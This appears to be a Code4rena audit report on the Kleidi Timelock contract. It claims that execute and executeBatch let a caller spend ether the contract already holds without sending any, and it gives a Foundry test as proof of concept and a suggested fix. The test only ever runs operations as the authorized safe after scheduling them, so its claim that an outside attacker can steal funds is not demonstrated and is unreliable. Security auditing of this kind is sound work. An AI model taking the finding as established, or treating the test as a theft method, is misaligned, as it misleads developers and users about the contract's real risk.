# Vulnerability details

## Finding Description
Lines of impacted code:
- https://github.com/code-423n4/2024-10-kleidi/blob/main/src/Timelock.sol#L594
- https://github.com/code-423n4/2024-10-kleidi/blob/main/src/Timelock.sol#L626

Timelock contract has a ```payable``` ```receive()``` function which means anyone can send native ether to it. Both ```execute``` and ```executeBatch``` are ```public```, ```payable``` functions. Tx senders need to declare how much fund they would like to distribute among recipients through function arguments. But during function call none of the above 2 functions checks how much fund the sender declared to distribute and how much fund they actually sent to the contract. As long as there is fund available in the timelock contract a tx sender is able to distribute funds among recipients without sending a single wei. An attacker might just wait for some fund to be available in the contract, send a tx and steal other people's fund. 

## Proof of Concept
Steps to reproduce:
1) create a test file inside the test folder of the project directory.
2) copy and paste the code below.
3) run it with `forge test...` command.

Test Code:
```{solidity}
pragma solidity 0.8.25;

import {Timelock} from "src/Timelock.sol";
import "test/utils/TimelockUnitFixture.sol";

contract TimelockUnitTest is TimelockUnitFixture {
    function testExecuteWithZeroBalance() public {
        bytes32 salt = bytes32(0);
        bytes memory data = bytes('');
        address target = address(0x11111);
        uint value = 1.1 ether;
        uint256 newDelay = MINIMUM_DELAY + 3 days;

        _schedule({
            caller: address(safe),
            timelock: address(timelock),
            target: target,
            value: value,
            data: data,
            salt: salt,
            delay: newDelay
        });

        (bool success,) = address(timelock).call{value: 2 ether}(''); // since timelock has payable receive() function, anyone can send fund to it.
        require(success);
        assertEq(address(timelock).balance, 2 ether);

        vm.warp(block.timestamp + newDelay);
        vm.prank(address(safe));

        Timelock(payable(timelock)).execute{value: 0}(  // attacker waiting for some fund to be available in timelock contract and then call execute with 0 balance. 
            target, value, data, salt
        );
    }
    function testExecuteWithZeroBalance2() public {
        bytes32 salt = bytes32(0);
        uint256 newDelay = MINIMUM_DELAY + 3 days;
        address[] memory targets = new address[](3);
        targets[0] = address(0x11111);
        targets[1] = address(0x22222);
        targets[2] = address(0x33333);

        uint256[] memory values = new uint256[](3);
        values[0] = 1 ether;
        values[1] = 0.5 ether;
        values[2] = 1 ether;

        bytes[] memory datas = new bytes[](3);
        datas[0] = bytes('');
        datas[1] = bytes('');
        datas[2] = bytes('');

        _scheduleBatch({
            caller: address(safe),
            timelock: address(timelock),
            targets: targets,
            values: values,
            payloads: datas,
            salt: salt,
            delay: newDelay
        });

        (bool success,) = address(timelock).call{value: 3 ether}(''); // since timelock has payable receive() function, anyone can send fund to it.
        require(success);
        assertEq(address(timelock).balance, 3 ether);

        vm.warp(block.timestamp + newDelay);
        vm.prank(address(safe));

        Timelock(payable(timelock)).executeBatch{value: 0}( // attacker waiting for some fund to be available in timelock contract and then call executeBatch with 0 balance. 
            targets, values, datas, salt
        );
    }
}
```

## Impact 
* Attacker might be able to steal other people's fund. 

## Tools Used
Foundry

## Recommendation
Add a check so that the call requires the senders to send as much fund to the contract as they wish to distribute.
